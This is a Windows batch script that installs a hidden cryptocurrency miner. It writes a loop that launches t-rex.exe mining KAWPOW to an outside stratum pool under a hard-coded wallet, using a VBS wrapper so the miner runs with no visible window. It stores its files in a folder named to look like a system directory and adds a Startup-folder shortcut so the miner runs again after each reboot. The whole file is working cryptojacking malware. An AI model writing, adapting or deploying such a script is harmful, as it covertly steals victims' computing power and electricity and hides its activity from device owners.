@echo off  
setlocal  
  
:: Define script name and path  
set "MINER_SCRIPT=%APPDATA%\WindowsSystem\miner.bat"  
set "VBS_SCRIPT=%APPDATA%\WindowsSystem\run_hidden.vbs"  
set "STARTUP_SHORTCUT=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\miner.lnk"  
  
:: Create necessary directories  
mkdir "%APPDATA%\WindowsSystem" 2>nul  
  
:: Write miner script  
echo @echo off > "%MINER_SCRIPT%"  
echo :loop >> "%MINER_SCRIPT%"  
echo ping -n 1 1.1.1.1 ^>nul || (timeout /t 5 >nul & goto loop) >> "%MINER_SCRIPT%"  
echo start /b t-rex.exe -a KAWPOW -o stratum+tcp://in.mining4people.com:4184 -u FGCUYXfyB5eE1M5Fb3vbq9RLHpq1tZ1ss1.HeHe >> "%MINER_SCRIPT%"  
  
:: Write VBS script to run miner in hidden mode  
echo Set WshShell = CreateObject("WScript.Shell") > "%VBS_SCRIPT%"  
echo WshShell.Run """%MINER_SCRIPT%""", 0, False >> "%VBS_SCRIPT%"  
  
:: Create a shortcut in the Startup folder  
powershell -command "$s=(New-Object -COM WScript.Shell).CreateShortcut('%STARTUP_SHORTCUT%'); $s.TargetPath='wscript.exe'; $s.Arguments='""%VBS_SCRIPT%""'; $s.Save()"  
  
:: Run miner immediately  
wscript "%VBS_SCRIPT%"  
  
exit
